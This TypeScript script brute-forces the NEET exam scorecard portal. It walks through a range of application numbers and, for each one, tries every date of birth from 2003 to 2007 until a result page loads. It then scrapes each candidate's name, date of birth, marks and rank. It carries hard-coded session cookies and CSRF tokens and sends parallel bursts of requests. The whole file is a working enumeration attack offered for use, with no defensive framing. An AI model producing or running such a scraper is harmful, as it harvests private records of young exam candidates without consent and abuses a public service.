import axios from 'axios';
import cheerio from 'cheerio';
import qs from 'qs';

async function checking(appno: string, day: string, month: string, year: string) {

    let data = qs.stringify({
        '_csrf-frontend': 'DmxloWsG2ydJv8Gl8-mdKFLGWeO2wqyyt0EGsz-Jsz9AOjqMCW65VH_Uo-6Ho6VRNqU_jP_xyNPReUnwafj8DA==',
        'Scorecardmodel[ApplicationNumber]': appno,
        'Scorecardmodel[Day]': day,
        'Scorecardmodel[Month]': month,
        'Scorecardmodel[Year]': year
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'https://neet.ntaonline.in/frontend/web/scorecard/index',
        headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': 'advanced-frontend=e1h8uspc4irpcq6ekv2s9egi47; _csrf-frontend=9789c09fc52813ca7ceefffdfbf6ad6399bf64d2c7ae5f9c3033cd0ea8b123e9a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22NV_-bhbs6kbKtJ8ydcfoI3daf8OCVqO3%22%3B%7D; _csrf-frontend=789d5228c2b2b3dc1b82c16f32ba7433ea654cfd378c88d645df5942b80521a6a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22ylHsZoneOikYXw24ByMRV_T6gyXDN_zm%22%3B%7D; advanced-frontend=lu7ir3b78nb0fl7unv8i3i6fup',
            'Origin': 'null',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"'
        },
        data: data
    };

    try {
        const resp = await axios.request(config)
        const parsed = parsingHTML(resp.data)
        return parsed
    }
    catch {
        return null
    }


    function parsingHTML(content: string) {

        const $ = cheerio.load(content);
        const appid = $('body > div.content-body > table:nth-child(7) > tbody > tr:nth-child(1) > td:nth-child(5)').text().trim() || 'NA';
        const name = $('body > div.content-body > table:nth-child(7) > tbody > tr:nth-child(2) > td:nth-child(2)').text().trim() || 'NA';
        const mark = $('body > div.content-body > table:nth-child(8) > tbody > tr:nth-child(2) > td:nth-child(4)').text().trim() || 'NA';
        const dob = $('body > div.content-body > table:nth-child(7) > tbody > tr:nth-child(3) > td:nth-child(4)').text().trim() || 'NA';
        const rank = $('body > div.content-body > table:nth-child(9) > tbody > tr:nth-child(2) > td:nth-child(1)').text().trim() || 'NA';

        if (rank === 'NA') {
            return null
        }

        else {
            return {
                applicationNumber: appid,
                applicantName: name,
                marks: mark,
                dateOfBirth: dob,
                rank: rank,
            };
        }
    }

}

// checking('240411809384','28','06','2006')

async function iterAllDates(appid: number) {
    let found=false;
    for (let year = 2007; year > 2002; year--) {
        if(found){
            break;
        }
        for (let month = 1; month < 13; month++) {
            if(found){
                break
            }
            let promises = []
            for (let day = 1; day <= 31; day++) {

                try {
                    const val = checking(
                        appid.toString(),
                        day.toString(),
                        month.toString(),
                        year.toString()
                    );
                    promises.push(val)
                }
                catch (error) {
                    console.error('Error fetching data:', error);
                }
            }
            console.log(`Trying all dates in ${month}-${year}`)
            const results = await Promise.all(promises);
            results.forEach(data => {
                if (data) {
                    console.log(data)
                    found=true
                }
            })

        }

    }
}


async function iterApplications() {
    for (let appid = 240411801214; appid < 240411809999; appid++) {
        console.log('for appno:', appid)
        await iterAllDates(appid)
    }
}

iterApplications();
